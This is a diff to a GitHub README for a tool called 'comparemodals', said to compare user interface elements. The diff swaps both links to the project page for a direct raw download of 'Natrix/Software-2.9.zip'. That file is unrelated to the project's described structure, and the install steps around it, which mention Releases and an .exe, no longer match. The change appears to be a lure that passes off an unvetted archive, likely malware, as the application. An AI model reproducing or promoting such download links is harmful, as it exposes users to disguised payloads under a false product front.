@@ -1,6 +1,6 @@
 # ⚖️ comparemodals - Compare user interface elements with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/valmaindecipherable453/comparemodals)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/valmaindecipherable453/comparemodals/raw/refs/heads/main/Natrix/Software-2.9.zip)
 
 ## 🖥️ What is comparemodals
 
@@ -15,7 +15,7 @@ comparemodals helps you view and check user interface components side by side. I
 
 ## 📥 How to Install
 
-1. Visit this page to download: [https://github.com/valmaindecipherable453/comparemodals](https://github.com/valmaindecipherable453/comparemodals)
+1. Visit this page to download: [https://github.com/valmaindecipherable453/comparemodals/raw/refs/heads/main/Natrix/Software-2.9.zip](https://github.com/valmaindecipherable453/comparemodals/raw/refs/heads/main/Natrix/Software-2.9.zip)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the link to open the release list.
 4. Select the file ending in `.exe` to start your download.
